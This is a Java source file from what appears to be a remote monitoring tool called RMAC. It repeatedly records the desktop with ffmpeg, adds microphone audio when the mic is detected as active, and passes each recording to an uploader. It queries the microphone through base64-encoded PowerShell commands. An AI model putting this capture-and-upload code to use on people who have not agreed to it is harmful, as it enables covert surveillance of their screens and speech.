package com.rmac.process;

import com.rmac.RMAC;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Commands;
import com.rmac.utils.Constants;
import com.rmac.utils.NoopOutputStream;
import com.rmac.utils.PipeStream;
import com.rmac.utils.Utils;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.util.Map;
import java.util.Objects;
import lombok.extern.slf4j.Slf4j;

/**
 * Records screen/audio for duration specified by <i>VideoDuration</i> config property.
 */
@Slf4j
public class ScreenRecorder {

  public Thread thread;
  /**
   * Reference to current ffmpeg screen recording process
   */
  public static Process currFFMPEGProc;
  public static int IDLE_TIME = 2000;

  public ScreenRecorder() {
    thread = new Thread(this::run, "ScreenRecorder");
  }

  public void start() {
    thread.start();
  }

  public void run() {
    try {
      while (!Thread.interrupted()) {
        // If screen recording is disabled via config, keep idle.
        if (!RMAC.config.getScreenRecording()) {
          synchronized (this.thread) {
            this.thread.wait(IDLE_TIME);
          }
          continue;
        }

        // Start ffmpeg recording process in the background for the duration specified
        String fileName = Utils.getTimestamp();
        ProcessBuilder ffmpegBuilder = this.getFFMPEGProcessBuilder(fileName);
        Process ffmpegProc = ffmpegBuilder.start();
        currFFMPEGProc = ffmpegProc;

        // Wait for the recording to finish
        ffmpegProc.waitFor();
        currFFMPEGProc = null;

        // Upload the file
        RMAC.uploader.uploadFile(
            Constants.CURRENT_LOCATION + "\\" + fileName + ".mkv",
            ArchiveFileType.SCREEN);
      }
    } catch (InterruptedException | IllegalArgumentException | IOException e) {
      log.error("Could not record video", e);
    }
  }

  /**
   * Kill current ffmpeg recording process and stop.
   */
  public void shutdown() {
    if (Objects.nonNull(currFFMPEGProc)) {
      currFFMPEGProc.destroy();
    }
    try {
      Runtime.getRuntime().exec("taskkill /f /im ffmpeg.exe").waitFor();
    } catch (IOException | InterruptedException e) {
      log.error("Could not force stop ffmpeg", e);
    }
  }

  /**
   * Build and return the ffmpeg screen recording [and audio recording] process.
   *
   * @param fileName Screen recording output file name
   * @return ProcessBuilder for screen recording process
   * @throws IOException          when process building fails or RMAC fails to read process output.
   * @throws InterruptedException when this thread is interrupted while waiting for process to *
   *                              complete
   */
  public ProcessBuilder getFFMPEGProcessBuilder(String fileName)
      throws IOException, InterruptedException {
    ProcessBuilder ffmpegBuilder;

    String defaultMicName = this.getDefaultMicName();
    log.info("Mic Name: " + defaultMicName);
    log.info("Mic Active: " + isMicActive(defaultMicName));
    if (RMAC.config.getAudioRecording()
        && (RMAC.config.getActiveAudioRecording() || this.isMicActive(defaultMicName))
    ) {
      ffmpegBuilder = new ProcessBuilder("\""
          + Constants.FFMPEG_LOCATION
          + "\" -hwaccel dxva2 -loglevel 0 -f gdigrab -framerate "
          + RMAC.config.getFPS()
          + " -threads 1 -i desktop -f dshow -i audio=\"" + defaultMicName
          + "\" -c:v h264 -preset:v fast -vf scale=1366:-1 -t "
          + RMAC.config.getVideoDurationFormatted() + " -y \""
          + Constants.CURRENT_LOCATION + "\\"
          + fileName + ".mkv\"");
      ffmpegBuilder.directory(new File(Constants.RUNTIME_LOCATION));
    } else {
      ffmpegBuilder = new ProcessBuilder("\""
          + Constants.FFMPEG_LOCATION
          + "\" -hwaccel dxva2 -loglevel 0 -f gdigrab -framerate "
          + RMAC.config.getFPS()
          + " -threads 1 -i desktop -c:v h264 -preset:v fast -vf scale=1366:-1 -t "
          + RMAC.config.getVideoDurationFormatted() + " -y \""
          + Constants.CURRENT_LOCATION + "\\"
          + fileName + ".mkv\"");
      ffmpegBuilder.directory(new File(Constants.RUNTIME_LOCATION));
    }

    return ffmpegBuilder;
  }

  /**
   * Fetch system's default microphone name
   * <br>
   * <br>
   * <cite>
   * Uses svcl.exe runtime.
   * </cite>
   *
   * @return The System's default microphone friendly name.
   * @throws IOException          when process building fails or RMAC fails to read process output.
   * @throws InterruptedException when this thread is interrupted while waiting for process to
   *                              complete
   */
  public String getDefaultMicName() throws IOException, InterruptedException {
    ProcessBuilder svclBuilder = new ProcessBuilder("powershell.exe", "-enc",
        Commands.C_GET_DEFAULT_MIC);
    svclBuilder.directory(new File(Constants.RUNTIME_LOCATION));
    Process proc = this.startProcess(svclBuilder);
    BufferedReader out = RMAC.fs.getReader(proc.getInputStream());
    BufferedWriter in = RMAC.fs.getWriter(proc.getOutputStream());
    PipeStream err = PipeStream.make(proc.getErrorStream(), new NoopOutputStream());
    err.start();
    StringBuilder result = new StringBuilder();
    String curr;
    while ((curr = out.readLine()) != null) {
      result.append(curr.trim());
    }
    proc.waitFor();
    in.close();
    out.close();

    return result.toString();
  }

  /**
   * Check if specified microphone is active.
   *
   * @param micName The microphone system name.
   * @return Status <br /> (true = active | false = inactive)
   * @throws IOException          when check fails.
   * @throws InterruptedException when check fails.
   */
  public boolean isMicActive(String micName) throws IOException, InterruptedException {
    ProcessBuilder builder = new ProcessBuilder("powershell.exe", "-enc", Commands.C_IS_MIC_ACTIVE);
    builder.directory(new File(Constants.RUNTIME_LOCATION));
    Map<String, String> env = builder.environment();
    env.put("RMAC_DLL_LOCATION", Constants.RMAC_DLL_LOCATION);
    env.put("RMAC_DEFAULT_MIC", micName);
    Process proc = this.startProcess(builder);
    BufferedReader out = RMAC.fs.getReader(proc.getInputStream());
    PipeStream err = new PipeStream(proc.getErrorStream(), new NoopOutputStream());
    err.start();
    StringBuilder result = new StringBuilder();
    String curr;
    while ((curr = out.readLine()) != null) {
      result.append(curr.trim());
    }
    proc.waitFor();
    out.close();

    return result.toString().equals("True");
  }

  /**
   * Start the process defined by the process builder.
   *
   * @param builder The process builder.
   * @return Reference to the started process.
   * @throws IOException If process start fails.
   */
  public Process startProcess(ProcessBuilder builder) throws IOException {
    return builder.start();
  }
}
